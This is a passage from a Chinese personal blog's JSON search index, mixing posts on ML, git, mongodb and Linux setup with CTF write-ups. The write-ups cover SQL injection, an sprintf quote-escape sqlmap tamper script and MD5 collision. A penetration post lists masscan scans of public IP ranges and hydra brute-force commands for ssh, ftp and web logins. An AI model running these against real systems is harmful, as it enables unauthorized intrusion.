\"/var/html/\".$module....","categories":[{"name":"ctf","slug":"ctf","permalink":"https://17307.github.io/categories/ctf/"}],"tags":[{"name":"文件包含","slug":"文件包含","permalink":"https://17307.github.io/tags/文件包含/"}]},{"title":"SVM支持向量机","slug":"SVM支持向量机","date":"2018-09-15T02:18:24.000Z","updated":"2019-02-02T11:52:17.000Z","comments":true,"path":"2018/09/15/SVM支持向量机/","link":"","permalink":"https://17307.github.io/2018/09/15/SVM支持向量机/","excerpt":"","text":"","categories":[{"name":"ML&DL","slug":"ML-DL","permalink":"https://17307.github.io/categories/ML-DL/"}],"tags":[]},{"title":"机器学习概述","slug":"机器学习概述","date":"2018-09-15T02:16:18.000Z","updated":"2019-02-02T11:52:17.000Z","comments":true,"path":"2018/09/15/机器学习概述/","link":"","permalink":"https://17307.github.io/2018/09/15/机器学习概述/","excerpt":"","text":"Numpy基础矩阵以及运算矩阵首先,我认为,只需要两组数,就可以代表空间.123456789101112131415161718192021a = [1, 0]print(np.shape(a)) # (2,)a = [[1, 0]] print(np.shape(a)) # (1,2)a = [[1, 0], [0, 1]]print(np.shape(a)) # (2,2)\"\"\"而对于有多个矩阵的,类似于数组\"\"\"a = [[[1, 2], [2, 2]]]print(np.shape(a)) # (1,2,2)a = [[[1, 0], [0, 1]], [[2, 1], [3, 2]]]print(np.shape(a)) # (2,2,2) ---&gt; 2个2*2的矩阵c = np.array([[[[5], [14]], [[14], [50]]]])print(c.shape) # (1, 2, 2, 1) ----&gt; 1个(2个2*2矩阵) print(c.reshape(4)) # [ 5 14 14 50] 运算np.dot()矩阵乘法 np.outer()123456789101112\"\"\"[[1,2],[1,1]] * [[2,3],[1,3]] ===&gt; 先化成一维矩阵 [1,2,1,1] * [2,3,1,3]\"\"\"a = np.array([[1, 2], [1, 1]])b = np.array([[2, 3], [1, 3]])np.outer(a, b)#array([[2, 3, 1, 3],# [4, 6, 2, 6],# [2, 3, 1, 3],# [2, 3, 1, 3]]) np.multiply()为对应元素的乘积。 数据处理数字特征标准化12345from sklearn import preprocessingimport numpy as npX = np.array([[1., -1., 2.], [2., 0., 0.], [0., 1., -1.]])X_scaled = preprocessing.scale(X)print(X_scaled) 正则化12345from sklearn import preprocessingimport numpy as npX = np.array([[1., -1., 2.], [2., 0., 0.], [0., 1., -1.]])X_scaled = preprocessing.normalize(X, norm='l2')print(X_scaled) 归一化123456from sklearn import preprocessingimport numpy as npX = np.array([[1., -1., 2.], [2., 0., 0.], [0., 1., -1.]])min_max_scaler = preprocessing.MinMaxScaler()X_train_minmax = min_max_scaler.fit_transform(X)print(X_train_minmax) 文本型特征官方文档中文文档 数据读取可以读取 csv 数据 效果验证交叉验证中文文档","categories":[{"name":"ML&DL","slug":"ML-DL","permalink":"https://17307.github.io/categories/ML-DL/"}],"tags":[]},{"title":"indigo-comment配置","slug":"indigo-comment配置","date":"2018-09-08T10:27:35.000Z","updated":"2019-02-02T11:52:17.000Z","comments":true,"path":"2018/09/08/indigo-comment配置/","link":"","permalink":"https://17307.github.io/2018/09/08/indigo-comment配置/","excerpt":"","text":"indigo-comment 评论设置gitment 集成幸运的是,indigo的主题,已经默认集成了gitment,所以只需要配置一下这些内容就好: 其中的owner为你的用户名的哪个标识,repo为仓库名称,不是地址,clien_id与clien_secret为注册后得到的内容. 注册信息的填充方法 其中最主要的是最后一个内容:Authorization callback URL. 问题出现 404说明是owner 或者 repo 等信息填充有误. 评论初始化失败原因: 文章标题过长 解决: 通过在themes\\indigo\\layout\\_partial\\plugins\\gitment.ejs的模板中新增id字段.","categories":[{"name":"others","slug":"others","permalink":"https://17307.github.io/categories/others/"},{"name":"indego","slug":"others/indego","permalink":"https://17307.github.io/categories/others/indego/"}],"tags":[]},{"title":"INSERT INTO注入","slug":"INSERT INTO 注入","date":"2018-09-08T10:27:35.000Z","updated":"2019-02-02T11:52:17.000Z","comments":true,"path":"2018/09/08/INSERT INTO 注入/","link":"","permalink":"https://17307.github.io/2018/09/08/INSERT INTO 注入/","excerpt":"","text":"题目描述登陆,存在kindeditor编辑器,可以读取目录,无法上传,文件包含 题目分析在文章post处,存在insert into的注入 解决INSERT TO 语句INSERT INTO 表名称 VALUES (值1, 值2,....) payload构造在本题中,发现无法闭合&#39;.同时由于插入的content部分为&lt;textarea&gt;,所以需要将payload插入到标题.但是文章标题有长度限制,所以采取通过插入多条内容绕过.通过尝试,得到插入语句应该为:insert into 表 values (id,title,contetn).同时无法闭合最后的&#39;与).所以只能构造出相应的闭合. 可以查出用户的密码,解密后登陆到admin账户.进入文章管理界面,存在文件包含或者读取漏洞.通过php伪协议读出flag.php. 其他kindeditor漏洞上传漏洞(此题无法使用)目录扫描payload http://d478b0827d21432bae695d8f71ad9a799e6bc2c58d184cbe.game.ichunqiu.com/kindeditor/php/file_manager_json.php?path=/","categories":[{"name":"ctf","slug":"ctf","permalink":"https://17307.github.io/categories/ctf/"}],"tags":[{"name":"sql注入","slug":"sql注入","permalink":"https://17307.github.io/tags/sql注入/"}]},{"title":"百度杯战国","slug":"百度杯十一月战国","date":"2018-09-08T10:27:35.000Z","updated":"2019-02-02T11:52:17.000Z","comments":true,"path":"2018/09/08/百度杯十一月战国/","link":"","permalink":"https://17307.github.io/2018/09/08/百度杯十一月战国/","excerpt":"","text":"part1 流量包分析注入描述内容隐藏在pacp包中.打开pacp包,发现所有http头部的user-aghet存在sqlmap关键字,所以提取所有的http包,然后提取出sqlmap的注入字段. 解析json文件首先,发现cookie中存在user是进行了编码的payload.经过判断,是先rot13编码,然后base64编码.经过处理后,得到一些列payload.提示: sqlmap 找到正确字符时会进行 != 判断 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748import jsonimport base64fp = open(r\"C:\\Users\\lhy\\Desktop\\1.json\", 'r')c = json.load(fp)print(c[1]['_source']['layers']['http']['http.user_agent'])u_e = []for i in c: agent = i['_source']['layers']['http']['http.user_agent'] if 'sqlmap' in agent: cookie = i['_source']['layers']['http']['http.cookie'] cookie = cookie.split(\";\")[0] cookie_en = cookie.split(\"=\")[-1] u_e.append(cookie_en)def rot13(message): res = '' for item in message: if (item &gt;= 'A' and item &lt;= 'M') or (item &gt;= 'a' and item &lt;= 'm'): res += chr(ord(item) + 13) elif (item &gt;= 'N' and item &lt;= 'Z') or (item &gt;= 'n' and item &lt;= 'z'): res += chr(ord(item) - 13) else: res += item return ress = \"\"for test in u_e: try: test = test.replace(\"%3D\", \"=\") test = test.replace(\"%3d\", \"=\") test = rot13(test) test = base64.b64decode(test) # assert isinstance(test, bytes) test = test.decode(\"utf8\", errors='ignore') if (test.find('!=') != -1) and (test.find('message') != -1): test = test.split(\"!=\")[-1] test = test.split(\",\")[0] # print(test) s += chr(int(test)) except: continueprint(s)# 2my_password_is_ilovedaliang0balabalabala1! 经过判断,message为 my_password_is_ilovedaliang part2 md5碰撞描述下载内容后,上传.提示它添加了slat.于是添加它的密码作为salt,给出提示,no same file.扫描文件,发现文件备份 .***.php.swp下载内容,源码为12345678balablablabbalablablabbalablablab$salt = isset($_REQUEST['postfix_salt'])?$_REQUSET['postfix_salt']:'ilovedaliang';$real_mdt = mdt(file_get_contents(\"./certification.txt\").$salt);balablablabbalablablabbalablablab 它做md5的比较其实是: ==你上传的文件与服务的的certification.txt+$salt的md5比较==. 解决所以可以通过certification.txt生成两个前缀相同,后面不一样且md5相同的文件.原理(md5碰撞) 使用工具,fastcoll_v1.0.0.5.exe1fastcoll_v1.0.0.5.exe -p certification.txt 然后上传一个文件,同时把第二个文件的后面增加的内容添加到参数postfix中.注意:该如何将那些内容添加到参数.首先,我传了其中某个文件,然后将文件结尾内容发送到了decoder中,然后将这些内容进行url编码. part3php反序列化漏洞cve-2016-5771 https://www.cdxy.me/?p=682 part4命令注入直接看了writeup.发现是命令注入.拿到shell后分析下.应该发生在第二句话.","categories":[{"name":"ctf","slug":"ctf","permalink":"https://17307.github.io/categories/ctf/"}],"tags":[{"name":"sql注入","slug":"sql注入","permalink":"https://17307.github.io/tags/sql注入/"},{"name":"流量包分析","slug":"流量包分析","permalink":"https://17307.github.io/tags/流量包分析/"},{"name":"sqlmap","slug":"sqlmap","permalink":"https://17307.github.io/tags/sqlmap/"},{"name":"php反序列化","slug":"php反序列化","permalink":"https://17307.github.io/tags/php反序列化/"},{"name":"md5碰撞","slug":"md5碰撞","permalink":"https://17307.github.io/tags/md5碰撞/"}]},{"title":"sprintf格式逃逸注入","slug":"sprintf格式输出逃逸","date":"2018-09-08T10:27:35.000Z","updated":"2019-02-02T11:52:17.000Z","comments":true,"path":"2018/09/08/sprintf格式输出逃逸/","link":"","permalink":"https://17307.github.io/2018/09/08/sprintf格式输出逃逸/","excerpt":"","text":"格式化漏洞题目描述sql注入 + % 报错 题目分析格式化注入漏洞在php调用sprintf函数时,如果 参数的数量少于 %数量,会报错. 123456789$sql = \"select * from user where username = '%\\' and 1=1#' and password='%s';\";$args = \"admin\";echo sprintf( \"select * from user where username = '%\\' and 1=1#' and password='%s';\", $args) ;// 报错echo \"&lt;br&gt;\";$sql = \"select * from user where username = '%1$\\' and 1=1#' and password='%s';\";$args = \"admin\";echo sprintf( \"select * from user where username = '%1$\\' and 1=1#' and password='%s';\", $args) ;//select * from user where username = '' and 1=1#' and password='admin'; 其中通过%&#39;会先被waf过滤为%\\&#39;然后,sprintf会把%\\吞掉.其中%1$&#39;原理一样. 但是不知道为什么,%&#39;会报错. 而%1$&#39;不会报错 . 解决构造参数 admin%1$&#39; or 1=1 与 admin$1&#39; or 1=2存在报错注入.可以通过sqlmap编写 tamper 去跑. 编写tamper12345678910111213141516171819202122# -*- coding: utf-8 -*-# !/usr/bin/env python\"\"\"v0.0.12018.3.30filename: sprintf.py\"\"\"from lib.core.enums import PRIORITY__priority__ = PRIORITY.LOWdef dependencies(): passdef tamper(payload, **kwargs): \"\"\" 通过格式化字符串漏洞来完成对单引号的闭合 \"\"\" return payload.replace(\"'\", \"%1$'\") 然后执行 1sqlmap -r “request.txt” -p username –level 3 –dbms mysql –tamper sprintf.py","categories":[{"name":"ctf","slug":"ctf","permalink":"https://17307.github.io/categories/ctf/"}],"tags":[{"name":"sql注入","slug":"sql注入","permalink":"https://17307.github.io/tags/sql注入/"}]},{"title":"INSERT INTO注入","slug":"INSERT-INTO注入","date":"2018-09-06T09:01:33.000Z","updated":"2019-02-02T11:52:17.000Z","comments":true,"path":"2018/09/06/INSERT-INTO注入/","link":"","permalink":"https://17307.github.io/2018/09/06/INSERT-INTO注入/","excerpt":"","text":"","categories":[],"tags":[]},{"title":"虚拟机通信","slug":"虚拟机通信","date":"2018-08-30T12:04:00.000Z","updated":"2019-02-02T11:52:17.000Z","comments":true,"path":"2018/08/30/虚拟机通信/","link":"","permalink":"https://17307.github.io/2018/08/30/虚拟机通信/","excerpt":"与虚拟机通信相关","text":"与虚拟机通信相关 VMware-NAT 模式nat模式由vnet8网卡分配IP，网关，dns，虚拟机也可以设置自己想要的IP，指定的网段 虚拟网络拓扑图 原理分析首先明白vmware软件提供的功能：nat ，网关，dhcp，dns等功能。 把vmare想象成模拟成了nat设备，网关设备，交换机，dhcp设备，dns等多台设备，将真机和虚拟机组网起来，实现相互通信，虚拟机上网的功能。 注意在VMnet8交换机下,主机在虚拟局域网中的ip为192.168.128.1,这个地址是vm08网卡的地址,所以如果虚拟机想要ping主机,需要ping 192.168.128.1 VMware Network Adapter VMnet8的作用 在nat网络中，会使用到VMnet8交换机，真实主机上的VMware Network Adapter VMnet8连接到VMnet8交换机，来与虚拟机通信。所以VMware Network Adapter VMnet8仅仅是和Vmnet8虚拟机交换机网络通信的（192.168.128.0/24），并不提供路由功能。禁用掉VMware Network Adapter VMnet8网卡，虚拟机仍然能上网，只是真机与虚拟机之间不能通信。","categories":[{"name":"others","slug":"others","permalink":"https://17307.github.io/categories/others/"},{"name":"linux","slug":"others/linux","permalink":"https://17307.github.io/categories/others/linux/"}],"tags":[{"name":"linux","slug":"linux","permalink":"https://17307.github.io/tags/linux/"}]},{"title":"服务器安装","slug":"服务器安装","date":"2018-08-30T11:55:04.000Z","updated":"2019-02-02T11:52:17.000Z","comments":true,"path":"2018/08/30/服务器安装/","link":"","permalink":"https://17307.github.io/2018/08/30/服务器安装/","excerpt":"记一次服务器安装","text":"记一次服务器安装 U盘启动器选择工具为：UltraISO，但安装过程中会出现：无法从CD-ROM中找到镜像的问题……以及后面一系列问题。 解决方法：将Ubuntu镜像copy到U盘中，然后手动挂载，或者扫描U盘。 后经一位师兄提醒，将制作工具换为：Win32DiskImager.然后一切正常。 raid卡配置服务器有两块硬盘，需要配置raid卡。 本服务器通过CTRL+M进入配置页面。将两个硬盘的raid全都设置为0，然后重新初始化。 raid0与raid1区别： 如果2块硬盘，均为10GB. raid0模式中，最后的硬盘容量是 10GB+10GB=20GB raid1模式中，最后的硬盘容量是 10GB+10GB=10GB，其中一块硬盘是另一块硬盘的备份。 启动配置进入 bios 页面，然后再boot选项中选择配置U盘 启动优先，或者直接选择U盘启动。 坑问题描述出现了unable to install grub in /dev/md126X 分析关键点是在安装ubuntu的时候，安装grub所产生了错误，导致系统无法启动。其实ubuntu 12.04已经支持了这块服务器的megaraid软RAID的驱动，在内核目录能看到驱动程序（也可以从官网上下载）。所以在做分区的时候，其实也是能搜索到这个磁盘的，只是dev的名字有点怪，叫/dev/md126关键点是需要手工echo “(hd0) /dev/md126” &gt; /boot/device.map,然后grub-install 到/dev/md126上。因为在raid的安装上，如果要mount到合适的/boot分区，就必须mount到/dev/md126pX这种设备上，而这些设备是没有所谓MBR的，而GRUB的安装参数则必须要放到/dev/md126上，这个小小的差异就导致了问题。 解决方案当遇到了unable to install grub in /dev/md126X时，首先深呼吸，接杯水压压惊。 Now we start to install GRUB by our hand: 1234567891011121314151617181920212223242526272829303132333435`ALT+F2` #进入cmd界面首先`ls -al`看看有没有`target`这个文件夹，如果有就进到`target`中， 看看有没有`home`这个文件夹，如果还是有……就`mount /dev/md126pX /target/home`,如果没有`home` 就`mount /dev/md126pX /target`如果没有就`mkdir target`,然后 `mount /dev/md126pX /target`\"X\" is your partion dev number, you should know it from prev installation process.# mount -o bind /proc /target/proc# mount -o bind /sys /target/sys# mount --rbind /dev /target/dev（Now we do a chroot to the mount system.） # chroot /target /bin/bash(Now create the file device.map, used by GRUB.）# echo \"(hd0) /dev/md126\" &gt; /boot/device.map &lt;font color=\"red\"&gt;**NOTE THAT**:&lt;/font&gt;&lt;font color=\"blue\"&gt; use /dev/md126, NOT /dev/md126p1, it should the \"md126\"!&lt;/font&gt;# cp /boot/device.map /boot/grub/Now install grub # grub-install --root-directory=/ /dev/md126 # grub-setup /dev/md126 没有此工具，不执行也没什么问题# update-grub It will build the file: /boot/grub/grub.cfg Done.看到done后，`ALT+F1`退出命令行，重新安装gurb即可。 后记The key process is # echo “(hd0) /dev/md126” &gt; /boot/device.mapBecaulse the Ubuntu installation program use the /target partition /dev/md126p1 directory in grub-install, so it can’t be done in a raid. The RAID MBR is not on the first partition /dev/md126p1, but on the base devices file /dev/md126 ​","categories":[{"name":"others","slug":"others","permalink":"https://17307.github.io/categories/others/"},{"name":"linux","slug":"others/linux","permalink":"https://17307.github.io/categories/others/linux/"}],"tags":[{"name":"linux","slug":"linux","permalink":"https://17307.github.io/tags/linux/"}]},{"title":"ubuntu基础配置","slug":"ubuntu基础配置","date":"2018-08-30T11:52:36.000Z","updated":"2019-02-02T11:52:17.000Z","comments":true,"path":"2018/08/30/ubuntu基础配置/","link":"","permalink":"https://17307.github.io/2018/08/30/ubuntu基础配置/","excerpt":"ubuntu的简单配置","text":"ubuntu的简单配置 IP配置静态IPsudo gedit /etc/network/interfaces 123456auto [自己网卡]iface [自己网卡] inet staticaddress 192.168.8.100 //ipnetmask 255.255.255.0 //子网掩码gateway 192.168.8.2 //网关dns-nameserver 8.8.8.8 //dns 实测 8.8.8.8 sudo /etc/init.d/networking restart reboot 设置动态IP123auto eth0#iface eth0 inet staticiface eth0 inet dhcp 密码问题 ubuntu修改root密码，$ sudo passwd root su rootPassword:","categories":[{"name":"others","slug":"others","permalink":"https://17307.github.io/categories/others/"},{"name":"linux","slug":"others/linux","permalink":"https://17307.github.io/categories/others/linux/"}],"tags":[]},{"title":"ML基础","slug":"ML基础","date":"2018-08-30T11:42:49.000Z","updated":"2019-02-02T11:52:17.000Z","comments":true,"path":"2018/08/30/ML基础/","link":"","permalink":"https://17307.github.io/2018/08/30/ML基础/","excerpt":"","text":"","categories":[{"name":"ML&DL","slug":"ML-DL","permalink":"https://17307.github.io/categories/ML-DL/"}],"tags":[]},{"title":"端口渗透","slug":"端口渗透","date":"2018-08-30T10:01:00.000Z","updated":"2019-02-02T11:52:17.000Z","comments":true,"path":"2018/08/30/端口渗透/","link":"","permalink":"https://17307.github.io/2018/08/30/端口渗透/","excerpt":"端口渗透","text":"端口渗透 端口扫描telnettelnet 192.168.1.1 p masscan手工指定选项扫描12345678910# 手工指定选项扫描# masscan --rate=1000 -p21,22,23,25,U:69,110,143,U:161 --banners 202.181.132.0/24 103.15.135.0/24 203.174.48.0/24 203.124.10.0/24 202.65.218.0/24 202.181.196.0/24 -oL port_hacking.txt -p 指定要扫描的端口,同时指定多个端口要用逗号隔开--rate 指定发包速率,根据你自己的实际带宽来定--open-only 仅显示开放的端口--banners 获取banners-c 使用自定义的扫描配置文件--ping 扫之前是否要先ping下目标-oL 把扫描结果存到指定文件中--excludefile 排除不扫描的ip段 通过配置文件扫描 123456789101112# masscan -c masscan.conf # klion masscan config '#'表注释rate =1000.00 # 指定发包速率,根据自己的实际带宽计算output-format=list # 指定扫描结果保存的文件格式output-filename=/root/Desktop/port_hacking.txt # 指定要把扫描的结果文件保存到哪里output-status=open # 只保留开放的端口信息ports=80,443,8080,U:53 # 指定要扫描的端口,默认tcp,当然,你也可以指定UDP的端口,U即udprange=203.174.48.0/24 # 指定要扫描的ip段,可以连续指定多个,中间记得逗号隔开就好了ping=false # 扫描的时候要不要先ping下,true表示真,即pingbanners=true # 获取端口banner信息excludefile=/etc/zmap/blacklist.conf # 指定不扫描的ip段,可以把不想扫描的一些ip段都加到这个文件中,如:内网ip段是不需要扫的 nampzenmap端口爆破ssh12345678hydra -l root -w 10 -P pwd.txt -t 10 -v -f 192.168.1.20 ssh======================================-l root 指定爆破账号为root-w 10 指定每个线程的回应时间为10S-P pwd.txt 指定密码字典为pwd.txt-t 10 指定爆破线程为10个-v 指定显示爆破过程-f 查找到第一个可以使用的ID和密码的时候停止破解 https 1# hydra -m /index.php -l username -P pass.txt IP https pop31# hydra -l muts -P pass.txt my.pop3.mail pop3 telnet1# hydra IP telnet -l 用户 -P 密码字典 -t 32 -s 23 -e ns -f -V ftp12# hydra IP ftp -l 用户名 -P 密码字典 -t 线程(默认16) -vV# hydra IP ftp -l 用户名 -P 密码字典 -e ns -vV get方式提交,破解web登陆123# hydra -l 用户名 -p 密码字典 -t 线程 -vV -e ns IP http-get /admin/or# hydra -l 用户名 -p 密码字典 -t 线程 -vV -e ns -f IP http-get /admin/index.php","categories":[{"name":"PT","slug":"PT","permalink":"https://17307.github.io/categories/PT/"}],"tags":[]},{"title":"向mysql中导入大数据","slug":"向mysql中导入大数据","date":"2018-08-30T02:55:13.000Z","updated":"2019-02-02T11:52:17.000Z","comments":true,"path":"2018/08/30/向mysql中导入大数据/","link":"","permalink":"https://17307.github.io/2018/08/30/向mysql中导入大数据/","excerpt":"","text":"记一次导入数据中的问题由于某次需要导入一个超大的sql文件，遇到了许多问题。下面是解决办法1. 需要对my.ini进行一些配置，包括123max_allowed_packet = 768Mwait_timeout=2880000 interactive_timeout = 2880000 2. 提前设置数据库引擎 MYISAM InnoDB 等等 已知：MYISAM插入速度&gt;&gt;&gt;InnoDB 3. 如果实在是慢，可以先删掉索引、约束。","categories":[{"name":"web","slug":"web","permalink":"https://17307.github.io/categories/web/"},{"name":"db","slug":"web/db","permalink":"https://17307.github.io/categories/web/db/"}],"tags":[]},{"title":"配置访问虚拟机mariadb","slug":"配置访问虚拟机mariadb","date":"2018-08-30T02:54:12.000Z","updated":"2019-02-02T11:52:17.000Z","comments":true,"path":"2018/08/30/配置访问虚拟机mariadb/","link":"","permalink":"https://17307.github.io/2018/08/30/配置访问虚拟机mariadb/","excerpt":"","text":"防火墙开放3306端口iptables -A INPUT -p tcp --dport 3306 -j ACCEPT 修改数据库user mysql;GRANT ALL PRIVILEGES ON *.* TO &#39;root&#39;@&#39;%&#39;IDENTIFIED BY &#39;123456&#39; WITH GRANT OPTION;说明：root是登陆数据库的用户，123456是登陆数据库的密码，*就是意味着任何来源任何主机反正就是权限很大的样子。flush privileges;","categories":[{"name":"web","slug":"web","permalink":"https://17307.github.io/categories/web/"},{"name":"db","slug":"web/db","permalink":"https://17307.github.io/categories/web/db/"}],"tags":[]},{"title":"忘记mysql密码","slug":"忘记mysql密码","date":"2018-08-30T02:53:04.000Z","updated":"2019-02-02T11:52:17.000Z","comments":true,"path":"2018/08/30/忘记mysql密码/","link":"","permalink":"https://17307.github.io/2018/08/30/忘记mysql密码/","excerpt":"","text":"忘记xampp mysql的密码 停止mysql服务器 sudo /opt/lampp/lampp stopmysql 使用--skip-grant-tables 参数来启动 mysqld sudo /opt/lampp/sbin/mysqld --skip-grant-tables 再开一个终端(在终端中直接右键+B) 进入mysql sudo /opt/lampp/bin/mysql -uroot 修改密码 use mysql; update user set password=password(&quot;123456&quot;) where user=&quot;root&quot;; flush privileges; 重启服务","categories":[{"name":"web","slug":"web","permalink":"https://17307.github.io/categories/web/"},{"name":"db","slug":"web/db","permalink":"https://17307.github.io/categories/web/db/"}],"tags":[]},{"title":"git","slug":"git","date":"2018-08-29T13:12:13.000Z","updated":"2019-02-02T11:52:17.000Z","comments":true,"path":"2018/08/29/git/","link":"","permalink":"https://17307.github.io/2018/08/29/git/","excerpt":"git基础~","text":"git基础~ 常用 git init 将目录变成git管理目录 git add file 保存文件到暂存区 git commit -m “文件修改说明” 提交文件到分支 git status 查看仓库当前的状态 git diff 查看当前版本和上一版本的区别 12345git diff #是工作区(work dict)和暂存区(stage)的比较git diff --cached #是暂存区(stage)和分支(master)的比较git diff HEAD #查看工作区和版本库里面最新版本的区别git checkout -- file #可以丢弃工作区的修改：总之，就是让这个文件回到最近一次git commit或git add时的状态。git reset HEAD &lt;file&gt; 可以把暂存区的修改撤销掉 git log 查看历史记录 git reset -hard HEAD^ 版本回退到上一个版本（也可以将暂存区的修改退回到工作区） git reset -hard id 版本回退到commit id对应的版本 git checkout –file 撤销在工作区的修改 git rm file 删除版本库中的文件 本地分支回滚 如果你在本地做了错误提交，那么回退版本的方法很简单,先用下面命令找到要回退的版本的commit id： git reflog 接着回退版本: git reset --hard Obfafd 0bfafd 就是你要回退的版本的commit id的前面几位 自己的远程分支版本回退的方法 首先要回退本地分支：方法同上. 紧接着强制推送到远程分支：git push -f 注意：本地分支回滚后，版本将落后远程分支，必须 使用强制推送覆盖远程分支 ，否则无法推送到远程分支 关于远程仓库 git remote add origin git@github.com:17307/Learning.git git push origin master 推送到远程仓库 git clone - git@github.com:PrettyMask/learngit.- git 从远程仓库克隆 git remote rm origin 删掉远程仓库的命令 分支 git branch dev 创建名为 dev 的分支 git checkout dev 切换到dev分支 git merge dev 合并dev分支 git branch -d dev 删除分支dev git branch 查看分支并确定当前分支 git使用 创建好私钥后 1eval `ssh-agent -s` 返回 Agent pid 4784 然后将私钥添加到缓存 $ ssh-add .ssh/id_rsa $ ssh -p 2200 -i ~/.ssh/id_rsa_test user@ssh.test.com config配置文件 1234567891011121314$ vim ~/.ssh/configHost sshtest HostName ssh.test.com User user Port 2200 IdentityFile ~/.ssh/id_rsa_testHost ssttest2 HostName ssh.test2.com User user2 Port 2345 IdentityFile ~/.ssh/id_rsa_test2~路径为C：/User/.ssh 增加一段普通的话,作为测试. test test testjkjkkkkkkkkkkkk","categories":[{"name":"others","slug":"others","permalink":"https://17307.github.io/categories/others/"},{"name":"git","slug":"others/git","permalink":"https://17307.github.io/categories/others/git/"}],"tags":[]},{"title":"mongodb","slug":"mongodb","date":"2018-08-29T04:54:23.000Z","updated":"2019-02-02T11:52:17.000Z","comments":true,"path":"2018/08/29/mongodb/","link":"","permalink":"https://17307.github.io/2018/08/29/mongodb/","excerpt":"mongodb基础","text":"mongodb基础 Docker 搭建环境构建环境123456docker pull mongo:3.2docker run -p 27017:27017 -v $PWD/db:/data/db -d mongo:3.2-p 27017:27017 : 将容器的27017 端口映射到主机的27017 端口 -v $PWD/db:/data/db : 将主机中当前目录下的db挂载到容器的/data/db，作为mongo数据存储目录docker run -it mongo:3.2 mongo --host 172.17.0.1docker run -it mongo:3.2` 运行这个镜像 然后执行命令 `mongo --host 172.17.0.1 mongodbmongodb与sql型数据库类比 SQL术语/概念 MongoDB术语/概念 解释/说明 database database 数据库 table collection 数据库表/集合 row document 数据记录行/文档 column field 数据字段/域 index index 索引 table joins 表连接,MongoDB不支持 primary key primary key 主键,MongoDB自动将id字段设置为主键 数据库 一个mongodb中可以建立多个数据库。 MongoDB的默认数据库为”db”，该数据库存储在data目录中。 show dbs 执行 db 命令可以显示当前数据库对象或集合 运行 use 命令，可以连接到一个指定的数据库 use local 文档 文档是一组键值(key-value)对(即BSON) 文档中的键/值对是有序的。 文档中的值不仅可以是在双引号里面的字符串，还可以是其他几种数据类型（甚至可以是整个嵌入的文档)。 MongoDB区分类型和大小写。 MongoDB的文档不能有重复的键。 文档的键是字符串。除了少数例外情况，键可以使用任意UTF-8字符。 集合 集合就是 MongoDB 文档组,类似与sql数据库中的表格 可以将以下不同数据结构的文档插入到集合中: {“site”:”www.baidu.com&quot;}{“site”:”www.google.com&quot;,&quot;name&quot;:&quot;Google&quot;}{“site”:”www.runoob.com&quot;,&quot;name&quot;:&quot;菜鸟教程&quot;,&quot;num&quot;:5} 元数据 数据库一些信息 MongoDB 数据类型数据库连接 http://www.runoob.com/mongodb/mongodb-connections.html 数据库操作创建数据库use DATABASE_NAME 切换到数据库 use my_dababase ; 删除数据库 db.dropDatabase() 显示集合show collections 创建集合通过db.createCollection(name, options) 在 MongoDB 中，你不需要创建集合。当你插入一些文档时，MongoDB 会自动创建集合。 删除集合1234567use runoob switched to db runoob show tables site db.site.drop() true show tables 创建文档123db.COLLECTION_NAME.insert(document)document = (&#123;1:1&#125;) db.col.insert(document) 更新文档方法一1234567891011db.collection.update( &lt;query&gt;, # update的查询条件，类似sql update查询内where后面的。 &lt;update&gt;, # update的对象和一些更新的操作符（如$,$inc...）等，也可以理解为sql update查询内set后面的 &#123; upsert: &lt;boolean&gt;, # 可选，这个参数的意思是，如果不存在update的记录，是否插入objNew,true为插入，默认是false，不插入。 multi: &lt;boolean&gt;, # 可选，mongodb 默认是false,只更新找到的第一条记录，如果这个参数为true,就把按条件查出来多条记录全部更新。 writeConcern: &lt;document&gt; # 可选，抛出异常的级别。 &#125;)db.col.update(&#123;&apos;title&apos;:&apos;MongoDB 教程&apos;&#125;,&#123;$set:&#123;&apos;title&apos;:&apos;MongoDB&apos;&#125;&#125;) 方法二12345678910/*save() 方法通过传入的文档来替换已有文档*/db.collection.save( &lt;document&gt;, &#123; writeConcern: &lt;document&gt; &#125;)db.collection.updateOne() #向指定集合更新单个文档 db.collection.updateMany() #向指定集合更新多个文档 删除文档12345678deleteOne() deleteMany()如删除集合下全部文档： db.inventory.deleteMany(&#123;&#125;) 删除 status 等于 A 的全部文档： db.inventory.deleteMany(&#123; status : &quot;A&quot; &#125;) 删除 status 等于 D 的一个文档： db.inventory.deleteOne( &#123; status: &quot;D&quot; &#125; ) 查询1234567891011121314db.collection.find(query, projection)query ：可选，使用查询操作符指定查询条件 projection ：可选，使用投影操作符指定返回的键。查询时返回文档中所有键值， 只需省略该参数即可（默认省略）。条件:ANDdb.col.find(&#123;&quot;by&quot;:&quot;菜鸟教程&quot;, &quot;title&quot;:&quot;MongoDB 教程&quot;&#125;).pretty()ORdb.col.find(&#123;$or:[&#123;&quot;by&quot;:&quot;菜鸟教程&quot;&#125;,&#123;&quot;title&quot;: &quot;MongoDB 教程&quot;&#125;]&#125;).pretty()AND 和 ORdb.col.find(&#123;&quot;likes&quot;: &#123;$gt:50&#125;, $or: [&#123;&quot;by&quot;: &quot;菜鸟教程&quot;&#125;,&#123;&quot;title&quot;: &quot;MongoDB 教程&quot;&#125;]&#125;).pretty()projection 参数的使用方法:db.collection.find(query, &#123;title: 1, by: 1&#125;) // inclusion模式 指定返回的键，不返回其他键db.collection.find(query, &#123;title: 0, by: 0&#125;) // exclusion模式 指定不返回的键,返回其他键两种模式不可混用（因为这样的话无法推断其他键是否应返回） 条件查询 1234567891011121314db.col.find(&#123;likes : &#123;$lt : 150&#125;&#125;)$gt -------- greater than &gt; $gte --------- gt equal &gt;= $lt -------- less than &lt; $lte --------- lt equal &lt;= $ne ----------- not equal != $eq -------- equal = db.col.find(&#123;&quot;title&quot; : &#123;$type : 2&#125;&#125;) db.tabl1.deleteOne(&#123;&quot;likes&quot;:&#123;$exists: false&#125;&#125;)db.col.find(&#123;&#125;,&#123;&quot;title&quot;:1,_id:0&#125;).limit(1).skip(1)db.COLLECTION_NAME.find().sort(&#123;KEY:1&#125;) 1 为升序排列，而-1是用于降序排列db.col.createIndex(&#123;&quot;title&quot;:1,&quot;description&quot;:-1&#125;) 创建索引 聚合1db.mycol.aggregate([&#123;$group : &#123;_id : &quot;$by_user&quot;, num_tutorial : &#123;$sum : 